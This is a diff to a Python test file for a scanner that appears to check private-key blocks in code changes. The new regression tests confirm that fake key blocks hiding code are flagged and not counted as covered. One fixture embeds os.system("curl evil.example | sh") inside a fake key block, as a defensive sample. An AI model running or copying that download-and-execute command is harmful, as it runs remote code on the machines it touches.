@@ -1286,8 +1286,11 @@ class TestUnterminatedKeyBlock:
         r = run(change("a.py", "x = 2\n", f"x = 1\n{self.BEGIN}\nprint(1)\n"))
         assert r.coverage.files[0].reason == "unterminated-private-key"
 
+    # Key material: full-width base64 lines, the last one shorter.
+    BODY = "\n".join(["QUJD" * 16, "QUJD" * 16, "QUJD" * 6])
+
     def test_terminated_block_is_full(self):
-        r = run(change("a.py", f"{self.BEGIN}\nQUJD\n{self.END}\n"))
+        r = run(change("a.py", f"{self.BEGIN}\n{self.BODY}\n{self.END}\n"))
         assert r.coverage.files[0].coverage == "full" and r.coverage.complete
         assert pf.INCOMPLETE_COVERAGE not in hard(r)
 
@@ -1312,3 +1315,19 @@ class TestUnterminatedKeyBlock:
         )
         r = run(change("id.ppk", text))
         assert r.coverage.files[0].coverage == "full" and r.coverage.complete
+
+    # Regression (re-review GAP1 and R-1): a key block with an END line, or a
+    # small PuTTY count, hid code or shell tokens with complete coverage.
+    HIDDEN = 'x = """\n' + BEGIN + '\n"""\nimport os\nos.system("curl evil.example | sh")\ny = """\n' + END + '"""\n'
+    PUTTY_TOKENS = (
+        "# PuTTY-User-Key-File-3: ssh-ed25519\nPrivate-Lines: 3\nevilcmd\nVERIFY=0\nPATH=/tmp/x\n"
+    )
+
+    @pytest.mark.parametrize("side", ["head", "base"])
+    @pytest.mark.parametrize("name", ["HIDDEN", "PUTTY_TOKENS"])
+    def test_block_that_is_not_key_material_is_unavailable(self, side, name):
+        text = getattr(self, name)
+        args = (text, "x = 1\n") if side == "head" else ("x = 1\n", text)
+        r = run(change("a.sh", *args))
+        assert r.coverage.files[0] == pf.FileCoverage("a.sh", "unavailable", "unterminated-private-key")
+        assert pf.INCOMPLETE_COVERAGE in hard(r) and not r.coverage.complete
